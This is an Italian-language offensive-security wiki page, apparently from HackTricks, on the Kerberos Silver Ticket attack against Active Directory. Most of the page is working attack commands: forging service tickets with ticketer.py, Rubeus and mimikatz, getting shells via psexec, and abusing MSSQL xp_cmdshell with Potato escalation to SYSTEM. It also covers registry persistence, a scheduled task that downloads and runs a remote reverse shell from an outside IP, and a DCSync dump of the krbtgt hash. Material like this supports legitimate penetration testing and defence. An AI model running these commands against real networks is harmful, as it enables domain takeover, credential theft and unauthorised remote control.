# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attacco **Silver Ticket** comporta lo sfruttamento dei ticket di servizio negli ambienti Active Directory (AD). Questo metodo si basa sull'**acquisizione dell'NTLM hash di un account di servizio**, come un account computer, per forgiare un Ticket Granting Service (TGS) ticket. Con questo ticket forgiato, un attaccante può accedere a servizi specifici sulla rete, **impersonando qualsiasi utente**, generalmente puntando a privilegi amministrativi. Si sottolinea che l'uso di AES keys per forgiare i ticket è più sicuro e meno rilevabile.

> [!WARNING]
> I Silver Tickets sono meno rilevabili dei Golden Tickets perché richiedono solo l'**hash dell'account di servizio**, non l'account krbtgt. Tuttavia, sono limitati al servizio specifico che prendono di mira. Inoltre, basta compromettere la password di un utente: se comprometti la **password di un account con un SPN** puoi usare quella password per creare un Silver Ticket e impersonare qualsiasi utente per quel servizio.

Per la creazione dei ticket, vengono impiegati strumenti diversi in base al sistema operativo:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Su Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
### Esempio: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Il servizio CIFS è evidenziato come un bersaglio comune per accedere al file system della vittima, ma altri servizi come HOST e RPCSS possono anche essere sfruttati per task e query WMI.

Se possiedi l'hash NTLM (o la chiave AES) di un account di servizio SQL (es. sqlsvc) puoi forgiare un TGS per il MSSQL SPN e impersonare qualsiasi utente verso il servizio SQL. Da lì, abilita xp_cmdshell per eseguire comandi come l'account di servizio SQL. Se quel token ha SeImpersonatePrivilege, esegui una escalation con Potato per ottenere SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Se il contesto risultante ha SeImpersonatePrivilege (spesso vero per service accounts), usa una variante di Potato per ottenere SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Più dettagli sull'abuso di MSSQL e l'abilitazione di xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Panoramica delle tecniche Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servizi disponibili

| Tipo di servizio                           | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** puoi **richiedere tutti** questi ticket usando il parametro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event ID dei Silver tickets

- 4624: Accesso account
- 4634: Chiusura sessione account
- 4672: Accesso amministratore

## Persistenza

Per evitare che le macchine ruotino la loro password ogni 30 giorni impostare `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oppure puoi impostare `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` su un valore maggiore di 30 giorni per indicare il periodo di rotazione quando la password della macchina dovrebbe essere ruotata.

## Abuso dei Service tickets

Negli esempi seguenti immaginiamo che il ticket sia stato ottenuto impersonando l'account administrator.

### CIFS

Con questo ticket potrai accedere alle cartelle `C$` e `ADMIN$` via **SMB** (se esposte) e copiare file su una parte del filesystem remoto semplicemente facendo qualcosa del tipo:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sarai anche in grado di ottenere una shell sull'host o eseguire comandi arbitrari usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con questo permesso puoi creare attività pianificate su computer remoti ed eseguire comandi arbitrari:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con questi tickets puoi **eseguire WMI sul sistema della vittima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trova **maggiori informazioni su wmiexec** nella pagina seguente:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con accesso winrm a un computer puoi **accedervi** e persino ottenere una PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulta la pagina seguente per scoprire **altri modi per connetterti a un host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Nota che **winrm deve essere attivo e in ascolto** sul computer remoto per accedervi.

### LDAP

Con questo privilegio puoi dump the DC database using **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Per saperne di più su DCSync** nella seguente pagina:


{{#ref}}
dcsync.md
{{#endref}}


## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
